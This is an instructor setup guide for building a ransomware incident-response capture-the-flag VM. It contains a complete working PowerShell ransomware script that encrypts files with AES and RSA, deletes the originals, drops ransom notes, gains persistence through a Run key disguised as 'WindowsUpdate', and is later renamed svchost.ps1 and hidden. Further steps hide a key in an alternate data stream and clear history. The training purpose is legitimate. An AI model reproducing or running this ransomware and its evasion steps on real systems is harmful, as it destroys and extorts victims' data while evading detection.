---

## File 3: SETUP.md

```markdown
# Instructor Setup Guide

Complete walkthrough for building the ransomware CTF challenge.

## Prerequisites

- VirtualBox or VMware
- Windows 10 ISO
- 40GB free disk space
- 4GB RAM

## Step 1: Create Virtual Machine

1. Open VirtualBox → Click **New**
2. Name: `Ransomware-Challenge`
3. Type: Microsoft Windows
4. Version: Windows 10 (64-bit)
5. Memory: 4096 MB (4 GB)
6. Disk: 40 GB, dynamically allocated

## Step 2: Install Windows

1. Start VM, boot from Windows 10 ISO
2. Install Windows 10 Pro
3. Create account:
   - Username: `analyst`
   - Password: `IncidentResponse2024!`
4. Complete setup, turn off all privacy options

## Step 3: Prepare Environment

Open PowerShell as Administrator:
```powershell
Set-ExecutionPolicy Bypass -Force

##Create directories:

powershell
mkdir C:\IncidentResponse\Documents
mkdir C:\IncidentResponse\Keys
mkdir C:\IncidentResponse\Tools
mkdir "C:\Corporate_Archives\02_Legal_And_Compliance\Litigation_Threats\Class_Action_Noise_Complaints\Zoning_And_Environmental_Shields\County_Permits\Acoustic_Exemptions\Appeals_2025\Denied\recuva" -Force
mkdir "C:\Corporate_Archive\03_RND_Archive_DoNotDistribute\Expiremental_Data\System_Logs_Archive_DoNotDelete\2026_Active\Node_Alpha\Telemetry\Raw\Changelogs_Deprecated" -Force


##Step 4: Generate Encryption Keys
Save as generate_keys.ps1 and run:

powershell
$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider(2048)
$rsa.ToXmlString($true) | Out-File "C:\IncidentResponse\Keys\recovery-key.xml"
$rsa.ToXmlString($false) | Out-File "C:\IncidentResponse\Keys\public-key.xml"
Write-Host "Keys generated!"


##Step 5: Create Target Documents
Save as create_documents.ps1 and run:

powershell
$docs = "C:\IncidentResponse\Documents"

New-Item -ItemType Directory -Path "$docs\Projects" -Force
New-Item -ItemType Directory -Path "$docs\Financial" -Force
New-Item -ItemType Directory -Path "$docs\HR" -Force
New-Item -ItemType Directory -Path "$docs\IT" -Force

"This is secret data. Code: XK9mP2vL7qN3Wy4829" | Out-File "$docs\Projects\secret.txt"
"This is financial data" | Out-File "$docs\Financial\money.txt"
"This is employee data" | Out-File "$docs\HR\staff.txt"
"This is IT data" | Out-File "$docs\IT\systems.txt"

Copy-Item "C:\Windows\Web\Wallpaper\Windows\img0.jpg" "$docs\Projects\photo.jpg"

##Step 6: Create Ransomware
Save as ransomware.ps1:

powershell
$ErrorActionPreference = "SilentlyContinue"

$PublicKeyXml = Get-Content "C:\IncidentResponse\Keys\public-key.xml"
$TargetDir = "C:\IncidentResponse\Documents"
$Exts = @("*.txt", "*.jpg")

foreach ($ext in $Exts) {
    Get-ChildItem $TargetDir -Filter $ext -Recurse | ForEach-Object {
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.GenerateKey()
        $aes.GenerateIV()
        
        $content = [IO.File]::ReadAllBytes($_.FullName)
        $encryptor = $aes.CreateEncryptor()
        $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
        
        $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
        $rsa.FromXmlString($PublicKeyXml)
        $encKey = $rsa.Encrypt($aes.Key, $true)
        
        $output = New-Object IO.MemoryStream
        $output.Write([Text.Encoding]::ASCII.GetBytes("ENCRYPTED"), 0, 9)
        $output.Write([BitConverter]::GetBytes($encKey.Length), 0, 4)
        $output.Write($encKey, 0, $encKey.Length)
        $output.Write($aes.IV, 0, 16)
        $output.Write($encrypted, 0, $encrypted.Length)
        
        [IO.File]::WriteAllBytes("$($_.FullName).crypt", $output.ToArray())
        Remove-Item $_.FullName -Force
        
        $log = "$(Get-Date -f 'yyyy-MM-dd HH:mm:ss')|$($_.FullName)|$([Convert]::ToBase64String($aes.Key))"
        Add-Content "$env:APPDATA\Microsoft\Windows\Recent\cache.dat" -Value $log
    }
}

"YOUR FILES HAVE BEEN ENCRYPTED" | Out-File "$TargetDir\README.txt"
"Recovery Team Contact: recovery@secure-mail.net" | Out-File "$env:USERPROFILE\Desktop\URGENT_README.txt"

$reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty $reg -Name "WindowsUpdate" -Value "powershell -w hidden -f `"$PSCommandPath`""

attrib +h $PSCommandPath
while ($true) { Start-Sleep 60 }


##Step 7: Create Decryptor
Save as decryptor.ps1:

powershell
param([string]$TargetDir, [string]$KeyFile)

$privateKey = Get-Content $KeyFile -Raw
$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
$rsa.FromXmlString($privateKey)

Get-ChildItem $TargetDir -Filter "*.crypt" -Recurse | ForEach-Object {
    $data = [IO.File]::ReadAllBytes($_.FullName)
    
    $magic = [Text.Encoding]::ASCII.GetString($data[0..8])
    if ($magic -ne "ENCRYPTED") { continue }
    
    $keyLen = [BitConverter]::ToInt32($data[9..12], 0)
    $encKey = $data[13..(12 + $keyLen)]
    $iv = $data[(13 + $keyLen)..(12 + $keyLen + 15)]
    $encContent = $data[(29 + $keyLen)..($data.Length - 1)]
    
    $aesKey = $rsa.Decrypt($encKey, $true)
    
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $aesKey
    $aes.IV = $iv
    
    $decryptor = $aes.CreateDecryptor()
    $decrypted = $decryptor.TransformFinalBlock($encContent, 0, $encContent.Length)
    
    $origPath = $_.FullName -replace "\.crypt$", ""
    [IO.File]::WriteAllBytes($origPath, $decrypted)
    Remove-Item $_.FullName
    
    Write-Host "Recovered: $([IO.Path]::GetFileName($origPath))" -ForegroundColor Green
}

Get-ChildItem $TargetDir -Recurse -File | ForEach-Object {
    $content = Get-Content $_.FullName -Raw
    if ($content -match "Code:\s*([A-Za-z0-9]{10,20})") {
        Write-Host "`n!!! ACCESS CODE FOUND !!!" -ForegroundColor Green
        Write-Host "File: $($_.FullName)" -ForegroundColor Yellow
        Write-Host "Code: $($matches[1])" -ForegroundColor Cyan
    }
}

##Step 8: Execute and Hide
Run ransomware:

powershell
cd C:\IncidentResponse
.\ransomware.ps1

##Hide decryptor in ZIP:

powershell
Compress-Archive -Path "C:\IncidentResponse\Tools\decryptor.ps1" -DestinationPath "C:\Corporate_Archives\02_Legal_And_Compliance\Litigation_Threats\Class_Action_Noise_Complaints\Zoning_And_Environmental_Shields\County_Permits\Acoustic_Exemptions\Appeals_2025\Denied\recuva\tools.zip"
Remove-Item "C:\IncidentResponse\Tools\decryptor.ps1"

##Hide private key in ADS:

powershell
"This is a log file" | Out-File "C:\Corporate_Archive\03_RND_Archive_DoNotDistribute\Expiremental_Data\System_Logs_Archive_DoNotDelete\2026_Active\Node_Alpha\Telemetry\Raw\Changelogs_Deprecated\Node_Alpha_Emergency_Patch_20260518"
Get-Content "C:\IncidentResponse\Keys\recovery-key.xml" | Out-File "C:\Corporate_Archive\03_RND_Archive_DoNotDistribute\Expiremental_Data\System_Logs_Archive_DoNotDelete\2026_Active\Node_Alpha\Telemetry\Raw\Changelogs_Deprecated\Node_Alpha_Emergency_Patch_20260518" -Stream recovery_key
attrib +h "C:\Corporate_Archive\03_RND_Archive_DoNotDistribute\Expiremental_Data\System_Logs_Archive_DoNotDelete\2026_Active\Node_Alpha\Telemetry\Raw\Changelogs_Deprecated\Node_Alpha_Emergency_Patch_20260518"
Remove-Item "C:\IncidentResponse\Keys\recovery-key.xml"

##Move ransomware:

powershell
mkdir "C:\Windows\System32\Tasks\Maintenance" -Force
Move-Item "C:\IncidentResponse\ransomware.ps1" "C:\Windows\System32\Tasks\Maintenance\svchost.ps1"
attrib +h "C:\Windows\System32\Tasks\Maintenance\svchost.ps1"
Clean up:

powershell
Remove-Item "C:\IncidentResponse\Keys\public-key.xml"
Clear-History

##Step 9: Export VM
Shut down VM
VirtualBox: File → Export Appliance
Select VM → Save as Ransomware-Challenge.ova
Distribution
Give students:

Ransomware-Challenge.ova
Login: analyst / IncidentResponse2024!
Keep for yourself:

recovery-key.xml (backup)
This setup guide
Expected Solution
See STUDENT_GUIDE.md for complete solution walkthrough.
